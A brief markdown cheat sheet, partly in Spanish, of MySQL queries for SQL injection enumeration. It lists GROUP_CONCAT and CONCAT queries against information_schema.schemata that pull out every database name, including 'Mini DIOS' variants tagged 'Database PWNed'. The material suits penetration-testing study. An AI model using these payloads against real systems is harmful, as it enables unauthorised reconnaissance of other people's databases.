# SQLi: schema, schemata & DIOS

## `schema name` fron `information schema`

### Query basic

````sql
select schema_name from information_schema.schemata;
````

### Group Concat

#### Basic

````sql
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
````

#### Variantes

````sql
## Agregando un string para separador en forma de ':'
SELECT GROUP_CONCAT(schema_name SEPARATOR ' : ') FROM information_schema.schemata;

## Mini DIOS
SELECT GROUP_CONCAT('Database PWNed: ',schema_name) FROM information_schema.schemata;
````

### Concat

#### Basic

````sql
SELECT concat(schema_name) FROM information_schema.schemata;
````

#### Variantes

````sql
## Agregando un string para separador en forma de ':'
SELECT concat(schema_name, ' : ') FROM information_schema.schemata;

## Mini DIOS: DB Enum (schema enum)
SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemata;
````
